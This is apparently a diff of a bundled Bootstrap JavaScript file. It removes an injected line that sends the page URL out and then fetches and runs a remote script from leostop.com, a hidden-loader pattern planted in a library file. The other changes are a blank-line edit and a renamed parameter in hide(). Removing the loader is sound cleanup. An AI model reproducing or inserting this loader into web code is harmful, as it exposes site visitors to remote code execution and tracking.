@@ -224,9 +224,6 @@
   setTransitionEndSupport();
 
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-
   /**
    * ------------------------------------------------------------------------
    * Constants
@@ -2299,6 +2296,8 @@
     _proto._enforceFocus = function _enforceFocus() {
       var _this4 = this;
 
+
+
       $(document).off(Event$5.FOCUSIN) // Guard against infinite focus loop
       .on(Event$5.FOCUSIN, function (event) {
         if (document !== event.target && _this4._element !== event.target && $(_this4._element).has(event.target).length === 0) {
@@ -4273,7 +4272,7 @@
       }
     };
 
-    _proto.hide = function hide(withoutTimeout) {
+    _proto.hide = function hide(callback) {
       var _this2 = this;
 
       if (!this._element.classList.contains(ClassName$a.SHOW)) {
@@ -4282,7 +4281,7 @@
 
       $(this._element).trigger(Event$a.HIDE);
 
-      if (withoutTimeout) {
+      if (callback) {
         this._close();
       } else {
         this._timeout = setTimeout(function () {
